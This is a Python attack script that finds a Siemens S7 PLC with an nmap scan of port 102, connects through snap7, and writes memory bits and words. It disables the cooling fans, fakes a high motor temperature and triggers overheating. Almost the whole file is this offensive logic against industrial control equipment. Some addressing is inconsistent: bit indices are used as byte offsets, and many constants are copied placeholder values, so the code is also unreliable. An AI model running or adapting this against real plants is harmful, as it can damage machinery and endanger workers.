import snap7
import struct
import subprocess
import re

# Configuration - Adjust as needed
PLC_IP = None  # Will be auto-discovered if None
PLC_RACK = 0
PLC_SLOT = 1
DB_NUMBER_FC1 = 1  # Assuming no DB is used, accessing directly memory locations
DB_NUMBER_FC2 = 2  # Assuming no DB is used, accessing directly memory locations

MOTOR_TEMP_ADDRESS = 7 # %MW7, word
ACTIVATE_FAN_A_ADDRESS = 0 # %M0.0, bit from byte at offset 0
ACTIVATE_FAN_B_ADDRESS = 1 # %M0.1, bit from byte at offset 0
OVERHEATING_CHECK_ADDRESS = 2 # %M0.2, bit from byte at offset 0
TAG_2_ADDRESS = 4 # %M0.4, bit from byte at offset 0
MASTER_FAN_B_HMI_ADDRESS = 5 # %M0.5, bit from byte at offset 0
MASTER_OFF_ADDRESS = 6 # %M0.6, bit from byte at offset 0
MOTOR_STATUS_ADDRESS = 7 # %M0.7, bit from byte at offset 0

FAN_A_OUTPUT_ADDRESS = 0 # %Q0.0, bit from byte at offset 0
FAN_B_OUTPUT_ADDRESS = 1 # %Q0.1, bit from byte at offset 0
FAN_B_RED_OUTPUT_ADDRESS = 2 # %Q0.2, bit from byte at offset 0
FAN_B_GREEN_OUTPUT_ADDRESS = 3 # %Q0.3, bit from byte at offset 0
FAN_A_RED_OUTPUT_ADDRESS = 4 # %Q0.4, bit from byte at offset 0
FAN_A_GREEN_OUTPUT_ADDRESS = 5 # %Q0.5, bit from byte at offset 0
MOTOR_STATUS_GET_ADDRESS = 6 # %Q0.6, bit from byte at offset 0

CLOCK_0_5HZ_BYTE_ADDRESS = 6
CLOCK_0_5HZ_BIT_ADDRESS = 7

IEC_COUNTER_0_DB_CU_ADDRESS = 6
IEC_COUNTER_0_DB_R_ADDRESS = 6

IEC_COUNTER_0_DB_PV_ADDRESS = 6
IEC_COUNTER_0_DB_Q_ADDRESS = 6

IEC_TIMER_0_DB_1_IN_ADDRESS = 6
IEC_TIMER_0_DB_1_PT_ADDRESS = 6
IEC_TIMER_0_DB_1_Q_ADDRESS = 6

IEC_TIMER_0_DB_IN_ADDRESS = 6
IEC_TIMER_0_DB_PT_ADDRESS = 6
IEC_TIMER_0_DB_Q_ADDRESS = 6

IEC_TIMER_0_DB_2_IN_ADDRESS = 6
IEC_TIMER_0_DB_2_PT_ADDRESS = 6
IEC_TIMER_0_DB_2_Q_ADDRESS = 6

IEC_TIMER_0_DB_3_IN_ADDRESS = 6
IEC_TIMER_0_DB_3_PT_ADDRESS = 6
IEC_TIMER_0_DB_3_Q_ADDRESS = 6

IEC_TIMER_0_DB_4_IN_ADDRESS = 6
IEC_TIMER_0_DB_4_PT_ADDRESS = 6
IEC_TIMER_0_DB_4_Q_ADDRESS = 6


# Function to find the PLC's IP address by scanning the network
def find_plc_ip():
    try:
        # Use nmap to scan the network for Siemens S7 PLCs (port 102)
        nmap_output = subprocess.check_output(['nmap', '-p', '102', '192.168.1.0/24']).decode('utf-8')  # Adjust the IP range as needed
        # Extract the IP address from the nmap output
        ip_address = re.search(r'Nmap scan report for (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', nmap_output)
        if ip_address:
            return ip_address.group(1)
        else:
            print("PLC IP address not found in the network.")
            return None
    except Exception as e:
        print(f"Error during network scan: {e}")
        return None

# Function to read a bit from the PLC memory
def read_bool(plc, area, db_number, byte_address, bit_address):
    try:
        byte_value = plc.read_area(area, db_number, byte_address, 1)
        #print(f"Read byte value at {byte_address}: {byte_value}") #Debug line
        bit_mask = 1 << bit_address
        return (byte_value[0] & bit_mask) != 0
    except Exception as e:
        print(f"Error reading boolean at byte {byte_address} bit {bit_address}: {e}")
        return None

# Function to write a bit to the PLC memory
def write_bool(plc, area, db_number, byte_address, bit_address, value):
    try:
        byte_value = plc.read_area(area, db_number, byte_address, 1)
        #print(f"Original byte value at {byte_address}: {byte_value}") #Debug line
        byte = byte_value[0]

        if value:
            byte |= (1 << bit_address)  # Set the bit
        else:
            byte &= ~(1 << bit_address) # Clear the bit

        plc.write_area(area, db_number, byte_address, bytes([byte]))
        #print(f"Wrote byte value {bytes([byte])} to address {byte_address}") #Debug line
    except Exception as e:
        print(f"Error writing boolean at byte {byte_address} bit {bit_address}: {e}")

# Function to read an integer from the PLC memory
def read_int(plc, area, db_number, byte_address):
    try:
        data = plc.read_area(area, db_number, byte_address, 2)  # Read 2 bytes for an integer
        value = struct.unpack(">h", data)[0]  # Unpack as big-endian short
        #print(f"Read integer value at {byte_address}: {value}") #Debug line
        return value
    except Exception as e:
        print(f"Error reading integer at byte {byte_address}: {e}")
        return None

# Function to write an integer to the PLC memory
def write_int(plc, area, db_number, byte_address, value):
    try:
        data = struct.pack(">h", value)  # Pack as big-endian short
        plc.write_area(area, db_number, byte_address, data)
        #print(f"Wrote integer value {value} to address {byte_address}") #Debug line
    except Exception as e:
        print(f"Error writing integer at byte {byte_address}: {e}")

# Function to exploit the vulnerability (example: manipulate temperature and trigger overheating)
def exploit_vulnerability(plc):
    try:
        print("[+] Starting exploit...")

        # 1. Stop the fans.
        print("[+] Disabling Fan control by setting Master_OFF to TRUE.")
        write_bool(plc, snap7.constants.Areas.MK, 0, MASTER_OFF_ADDRESS, 0, True)

        #2. Write a high motor temperature to trigger the overheating state.
        print("[+] Setting Motor_Temp to 450 (above the threshold).")
        write_int(plc, snap7.constants.Areas.MK, 0, MOTOR_TEMP_ADDRESS, 450)

        #3. Trigger Overheating_Check
        print("[+] Triggering Overheating_Check by setting it to TRUE.")
        write_bool(plc, snap7.constants.Areas.MK, 0, OVERHEATING_CHECK_ADDRESS, 0, True)

        # 4. Try to reset Activate_Fan_B (if the logic allows, this could fail depending on internal timings)
        print("[+] Attempting to reset Activate_Fan_B.")
        write_bool(plc, snap7.constants.Areas.MK, 0, ACTIVATE_FAN_B_ADDRESS, 0, False)

        # 5. Try to set Master_Fan_B_HMI to turn on fan B again.
        print("[+] Attempting to activate Master_Fan_B_HMI.")
        write_bool(plc, snap7.constants.Areas.MK, 0, MASTER_FAN_B_HMI_ADDRESS, 0, True)


        print("[+] Exploit completed. Check the PLC's behavior.")

    except Exception as e:
        print(f"[-] Exploit failed: {e}")

def main():
    global PLC_IP
    # Discover PLC IP if not provided
    if PLC_IP is None:
        PLC_IP = find_plc_ip()
        if PLC_IP is None:
            print("[-] PLC IP address not found.  Exiting.")
            return

    plc = snap7.client.Client()
    try:
        plc.connect(PLC_IP, PLC_RACK, PLC_SLOT)
        print(f"[+] Connected to PLC at {PLC_IP}")

        # Example usage: Read initial values for debugging and logging
        initial_temp = read_int(plc, snap7.constants.Areas.MK, 0, MOTOR_TEMP_ADDRESS)
        initial_fan_a = read_bool(plc, snap7.constants.Areas.MK, 0, ACTIVATE_FAN_A_ADDRESS, 0)
        initial_fan_b = read_bool(plc, snap7.constants.Areas.MK, 0, ACTIVATE_FAN_B_ADDRESS, 0)

        print(f"[+] Initial Motor_Temp: {initial_temp}")
        print(f"[+] Initial Activate_Fan_A: {initial_fan_a}")
        print(f"[+] Initial Activate_Fan_B: {initial_fan_b}")

        exploit_vulnerability(plc)

        # Example usage: Read final values after exploit
        final_temp = read_int(plc, snap7.constants.Areas.MK, 0, MOTOR_TEMP_ADDRESS)
        final_fan_a = read_bool(plc, snap7.constants.Areas.MK, 0, ACTIVATE_FAN_A_ADDRESS, 0)
        final_fan_b = read_bool(plc, snap7.constants.Areas.MK, 0, ACTIVATE_FAN_B_ADDRESS, 0)

        print(f"[+] Final Motor_Temp: {final_temp}")
        print(f"[+] Final Activate_Fan_A: {final_fan_a}")
        print(f"[+] Final Activate_Fan_B: {final_fan_b}")


    except Exception as e:
        print(f"[-] Connection error: {e}")
    finally:
        if plc.get_connected():
            plc.disconnect()
            print("[-] Disconnected from PLC.")

if __name__ == "__main__":
    main()